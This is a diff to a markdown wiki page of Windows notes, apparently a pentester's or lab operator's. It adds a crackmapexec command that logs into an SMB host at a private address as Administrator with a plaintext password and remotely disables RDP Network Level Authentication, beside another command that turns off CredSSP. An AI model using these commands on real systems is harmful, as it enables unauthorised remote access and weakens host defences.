@@ -2,7 +2,7 @@
 title: Windows
 description: A quick summary of Windows
 published: true
-date: 2025-02-15T20:10:55.011Z
+date: 2025-02-15T20:20:16.152Z
 tags: 
 editor: markdown
 dateCreated: 2022-10-01T21:29:03.176Z
@@ -45,6 +45,11 @@ reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\Winstations\RDP-T
 ```
 
 ## Using Crackmapexec
+```text
+ crackmapexec smb 10.0.0.186 -u Administrator -p NewAdminPassword1! --exec-method smbexec -x 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f'
+ ```
+ 
+Hasn't worked yet:
 ```text
 crackmapexec smb 10.0.0.186 -u Administrator -p NewAdminPassword1! --exec-method smbexec -X 'Disable-WSManCredSSP -Role Server'
 ```
